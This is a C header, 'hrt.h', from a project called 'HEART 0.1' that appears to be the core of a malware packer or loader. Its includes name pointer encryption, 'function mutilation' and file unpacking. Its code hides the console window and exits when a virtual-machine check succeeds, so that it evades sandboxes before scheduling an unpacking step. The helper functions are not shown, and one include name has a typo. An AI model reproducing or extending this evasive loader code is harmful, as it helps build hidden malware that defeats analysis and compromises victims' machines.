/*
 *
 *	HEART 0.1
 *
 *	hrt.h
 *
 */

#ifndef _HRT_H_
#define _HRT_H_

#include "def.h"	/* General definitions */
#include "nt.h"		/* Native structures */
#include "flist.h"	/* Function list */
#include "util.h"	/* General utilities */
#include "ptr.h"	/* Pointer encryption */
#include "mem.h"	/* Memory utilities */
#include "str.h."	/* String utilities */
#include "mod.h"	/* Module utilities */
#include "img.h"	/* Image utilities */
#include "tp.h"		/* Timing */
#include "unpk.h"	/* File unpacking */
#include "vm.h"		/* VM detection */
#include "mut.h"	/* Function mutilation */
#include "schd.h"	/* Task scheduling */

HRT_SCHD_DATA g_Scheduler;
PHRT_SCHD_DATA g_SchedulerPtr;

VOID
HRTAPI
HrtInit(
	VOID )
{
	/*
	*	Prepare the function list
	*/
	HrtFListPrepare();

	/*
	*	Initialize the pointer secret with a random value
	*/
	HRT_PTR_INIT_RAND;

	/*
	*	Initialize the function list
	*/
	if ( !HrtFListInit() )
		HRT_EXIT;

	/*
	*	Initialize scheduler
	*/
	g_SchedulerPtr = &g_Scheduler;
	HRT_PTR_ENC_SELF( g_SchedulerPtr );

	/*
	*	Hide the console window
	*/
	V CurrWind = MyGetConsoleWindow();
	MyShowWindow( CurrWind,
				  SW_HIDE );
}

VOID
HRTAPI
HrtInitChk(
	PHRT_SCHD_DATA Sd )
{
	if ( HrtVmChk() ){
		HRT_DBG_TRACE( "VM check was true!\n" );

		HRT_EXIT;
	}

	HRT_DBG_TRACE( "VM check was false!\n" );

	HrtSchdTskNxt( Sd );
}

VOID
HRTAPI
HrtTskInit(
	VOID )
{
	HrtInit();

	/*
	*	Start running the tasks
	*/
	HrtSchdInit( g_SchedulerPtr );
	HrtSchdAddTsks( g_SchedulerPtr, 2, HrtInitChk, HrtUnpkUnpack );
	HrtSchdTskNxt( g_SchedulerPtr );
}

#endif